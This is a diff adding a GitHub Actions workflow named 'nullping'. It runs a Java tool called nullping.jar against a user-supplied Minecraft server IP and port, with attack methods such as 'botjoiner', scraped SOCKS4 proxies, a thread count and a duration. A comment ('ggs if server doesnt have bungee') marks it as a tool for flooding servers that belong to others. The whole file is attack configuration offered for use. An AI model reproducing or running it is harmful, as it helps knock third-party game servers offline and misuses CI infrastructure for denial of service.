@@ -1,0 +1,68 @@
+# nullping
+
+name: nullping on github.
+
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on push or pull request events but only for the "main" branch
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+    inputs:
+      server_ip_value:
+        description: 'ip of server'
+        required: true
+        default: 'localhost'
+        type: string
+      server_port_value:
+        description: 'server port value'
+        required: true
+        default: '25565'
+        type: string
+      nullping_method_value:
+        description: 'method of mcbot'
+        required: true
+        default: 'botjoiner'
+        type: string
+      site_proxies_value:
+        description: 'from which site scrape proxies'
+        required: true
+        default: 'https://openproxylist.xyz/socks4.txt'
+        type: string
+      minecraft_protocol_value:
+        description: 'set minecraft protocol for mcbot'
+        required: true
+        default: '340'
+        type: string
+      seconds:
+        description: 'seconds for mcbot'
+        required: true
+        default: '200'
+        type: string
+      threads:
+        description: 'threads for mcbot'
+        required: true
+        default: '-1'
+        type: string
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run mcbot with github actions. ggs if server doesnt have bungee lol:)
+        run: |
+          java -jar nullping.jar ${{ github.event.inputs.server_ip_value }} ${{ github.event.inputs.server_port_value }} ${{ github.event.inputs.threads}} 1 ${{ github.event.inputs.seconds}} ${{ github.event.inputs.nullping_method_value }}
+    env:
+      SERVER_IP_TEST: ${{ github.event.inputs.server_ip_value }}
+      server_port_value: ${{ github.event.inputs.server_port_value }}
+      NULLPING_METHOD_VALUE: ${{ github.event.inputs.nullping_method_value }}
+      SITE_PROXIES: ${{ github.event.inputs.site_proxies_value}}
+      minecraft_protocol_value: ${{ github.event.inputs.minecraft_protocol_value}}
+      seconds: ${{ github.event.inputs.seconds}}
+      threads: ${{ github.event.inputs.threads}}
